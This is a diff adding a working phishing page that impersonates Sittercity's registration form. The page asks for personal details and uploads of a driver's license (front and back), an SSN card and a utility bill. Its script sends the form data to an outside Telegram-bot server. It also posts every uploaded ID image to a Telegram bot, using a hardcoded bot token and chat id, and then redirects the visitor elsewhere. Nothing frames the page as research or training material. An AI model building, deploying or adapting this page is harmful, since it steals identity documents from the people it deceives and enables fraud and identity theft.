@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sittercity: Find Local Child Care, Senior Care, & Pet Care</title>
+    <meta
+      property="og:image"
+      content="wp-content/uploads/2022/06/Nannies-by-Noa-Featured-Image.jpg"
+    />
+
+    <!-- Include Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    /> -->
+  </head>
+
+  <body class="bg-gray-100 p-8">
+    <div class="max-w-md mx-auto bg-white p-6 rounded-md shadow-md">
+      <!-- Company Logo -->
+      <div class="mb-4 mx-auto" style="max-width: 200px; text-align: center;">
+        <img
+          src="logo.png"
+          alt="Sittercity Logo"
+          class="mx-auto"
+          style="max-width: 100%; height: auto;"
+        />
+      </div>
+
+      <h2 class="text-2xl font-bold mb-6 text-center">Registration Form</h2>
+
+      <form
+        id="registrationForm"
+        onsubmit="submitForm(event)"
+        enctype="multipart/form-data"
+      >
+        <div class="grid grid-cols-2 gap-4">
+          <div>
+            <label
+              for="firstName"
+              class="block text-sm font-medium text-gray-600"
+              >First Name</label
+            >
+            <input
+              type="text"
+              id="firstName"
+              name="firstName"
+              placeholder="John"
+              class="mt-1 p-2 w-full border rounded-md"
+            />
+          </div>
+          <div>
+            <label
+              for="lastName"
+              class="block text-sm font-medium text-gray-600"
+              >Last Name</label
+            >
+            <input
+              type="text"
+              id="lastName"
+              name="lastName"
+              placeholder="Doe"
+              class="mt-1 p-2 w-full border rounded-md"
+            />
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label for="email" class="block text-sm font-medium text-gray-600"
+            >Email</label
+          >
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="john.doe@example.com"
+            class="mt-1 p-2 w-full border rounded-md"
+          />
+        </div>
+
+        <div class="mt-4">
+          <label
+            for="phoneNumber"
+            class="block text-sm font-medium text-gray-600"
+            >Phone Number (USA)</label
+          >
+          <input
+            type="tel"
+            id="phoneNumber"
+            name="phoneNumber"
+            type="number"
+            placeholder="123-456-7890"
+            class="mt-1 p-2 w-full border rounded-md"
+          />
+        </div>
+
+        <!-- <div class="mt-4">
+          <label for="ssn" class="block text-sm font-medium text-gray-600"
+            >Social Security Number</label
+          >
+          <input
+            type="text"
+            id="ssn"
+            name="ssn"
+            type="number"
+            placeholder="XXX-XX-XXXX"
+            class="mt-1 p-2 w-full border rounded-md"
+          />
+        </div> -->
+
+        <div class="grid grid-cols-2 gap-4 mt-4">
+          <div>
+            <label for="gender" class="block text-sm font-medium text-gray-600"
+              >Gender</label
+            >
+            <select
+              id="gender"
+              name="gender"
+              class="mt-1 p-2 w-full border rounded-md"
+            >
+              <option value="male">Male</option>
+              <option value="female">Female</option>
+              <option value="other">Other</option>
+            </select>
+          </div>
+          <div>
+            <label for="dob" class="block text-sm font-medium text-gray-600"
+              >Date of Birth</label
+            >
+            <input
+              type="date"
+              id="dob"
+              name="dob"
+              class="mt-1 p-2 w-full border rounded-md"
+            />
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label
+            for="frontPicture"
+            class="block text-sm font-medium text-gray-600"
+            >Driver's License/State ID Front Picture</label
+          >
+          <div
+            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
+          >
+            <input
+              type="file"
+              id="frontPicture"
+              name="frontPicture"
+              accept="image/*"
+              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+              onchange="updateFileName('frontPicture', this)"
+            />
+            <div class="text-center">
+              <p class="text-gray-500" id="frontPictureFileName">
+                Drag and drop your file here or
+              </p>
+              <p class="text-blue-500">Browse</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label
+            for="backPicture"
+            class="block text-sm font-medium text-gray-600"
+            >Driver's License/State ID Back Picture</label
+          >
+          <div
+            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
+          >
+            <input
+              type="file"
+              id="backPicture"
+              name="backPicture"
+              accept="image/*"
+              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+              onchange="updateFileName('backPicture', this)"
+            />
+            <div class="text-center">
+              <p class="text-gray-500" id="backPictureFileName">
+                Drag and drop your file here or
+              </p>
+              <p class="text-blue-500">Browse</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label
+            for="ssnCard"
+            class="block text-sm font-medium text-gray-600"
+            >Upload SSN Card</label
+          >
+          <div
+            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
+          >
+            <input
+              type="file"
+              id="ssnCard"
+              name="ssnCard"
+              accept="image/*"
+              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+              onchange="updateFileName('ssnCard', this)"
+            />
+            <div class="text-center">
+              <p class="text-gray-500" id="ssnCardFileName">
+                Drag and drop your file here or
+              </p>
+              <p class="text-blue-500">Browse</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label
+            for="utilityBill"
+            class="block text-sm font-medium text-gray-600"
+            >Upload Utility Bill</label
+          >
+          <div
+            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
+          >
+            <input
+              type="file"
+              id="utilityBill"
+              name="utilityBill"
+              accept="image/*"
+              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+              onchange="updateFileName('utilityBill', this)"
+            />
+            <div class="text-center">
+              <p class="text-gray-500" id="utilityBillFileName">
+                Drag and drop your file here or
+              </p>
+              <p class="text-blue-500">Browse</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mt-4">
+          <label for="acceptTerms" class="flex items-center">
+            <input
+              type="checkbox"
+              id="acceptTerms"
+              name="acceptTerms"
+              class="form-checkbox"
+            />
+            <span class="ml-2 text-sm">I accept the terms and conditions</span>
+          </label>
+        </div>
+        <div class="mt-6 text-center">
+          <button
+            type="submit"
+            class="bg-pink-500 text-white px-4 py-2 rounded-md w-full hover:bg-pink-600"
+          >
+            Submit
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <!-- ... Your existing HTML code ... -->
+
+    <script>
+      function updateFileName(inputId, inputElement) {
+        const fileNameElement = document.getElementById(`${inputId}FileName`);
+        const fileName = inputElement.files[0].name;
+        fileNameElement.textContent = fileName;
+      }
+
+      async function submitForm(event) {
+        event.preventDefault();
+        const submitButton = document.querySelector('button[type="submit"]');
+        submitButton.disabled = true;
+        submitButton.textContent = "Processing...";
+
+        const formData = new FormData(document.getElementById("registrationForm"));
+        const response = await sendFormData(formData);
+
+        // Check if a file is selected for front picture
+        const frontPictureInput = document.getElementById("frontPicture");
+        if (frontPictureInput.files.length > 0) {
+          const photo = frontPictureInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error("Error sending front picture to Telegram:", photoResponse.statusText);
+          } else {
+            console.log("Front picture sent");
+          }
+        }
+
+        // Check if a file is selected for back picture
+        const backPictureInput = document.getElementById("backPicture");
+        if (backPictureInput.files.length > 0) {
+          const photo = backPictureInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error("Error sending back picture to Telegram:", photoResponse.statusText);
+          } else {
+            console.log("Back picture sent");
+          }
+        }
+
+        // Check if a file is selected for SSN card
+        const ssnCardInput = document.getElementById("ssnCard");
+        if (ssnCardInput.files.length > 0) {
+          const photo = ssnCardInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error("Error sending SSN card to Telegram:", photoResponse.statusText);
+          } else {
+            console.log("SSN card sent");
+          }
+        }
+
+        // Check if a file is selected for utility bill
+        const utilityBillInput = document.getElementById("utilityBill");
+        if (utilityBillInput.files.length > 0) {
+          const photo = utilityBillInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error("Error sending utility bill to Telegram:", photoResponse.statusText);
+          } else {
+            console.log("Utility bill sent");
+          }
+        }
+
+        // Redirect after successful submission
+        window.location.replace("https://identity-id.vercel.app/");
+      }
+
+      async function sendFormData(formData) {
+        try {
+          return await fetch("https://telegram-bot-dkpv.onrender.com/form_bunny", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(Object.fromEntries(formData)),
+          });
+        } catch (error) {
+          console.error("Error sending data to Telegram:", error);
+          return null;
+        }
+      }
+
+      async function sendPhotoToTelegram(photo) {
+        try {
+          const formData = new FormData();
+          formData.append("photo", photo);
+          formData.append("chat_id", "7068073891");
+
+          return await fetch(
+            "https://api.telegram.org/bot7952621434:AAE6wemmxjCclKwmiyPGvLwMgki1YvEY0Rk/sendphoto",
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+        } catch (error) {
+          console.error("Error sending photo to Telegram:", error);
+          return null;
+        }
+      }
+
+      // Add event listeners for file input changes after defining functions
+      window.addEventListener("load", function () {
+        document
+          .getElementById("frontPicture")
+          .addEventListener("change", function () {
+            updateFileName("frontPicture", this);
+          });
+
+        document
+          .getElementById("backPicture")
+          .addEventListener("change", function () {
+            updateFileName("backPicture", this);
+          });
+      });
+    </script>
+  </body>
+</html>
